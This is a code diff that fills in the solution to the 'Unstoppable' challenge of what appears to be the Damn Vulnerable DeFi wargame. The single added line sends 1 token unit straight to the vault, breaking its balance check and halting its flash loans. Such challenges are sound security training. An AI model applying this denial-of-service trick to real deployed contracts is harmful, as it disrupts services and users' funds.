@@ -91,7 +91,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Player already has 10 DVT (INITIAL_PLAYER_TOKEN_BALANCE)
+        // Just push 1 wei of it straight into the vault. One tx, no approvals needed.
+        token.transfer(address(vault), 1);    
     }
 
     /**
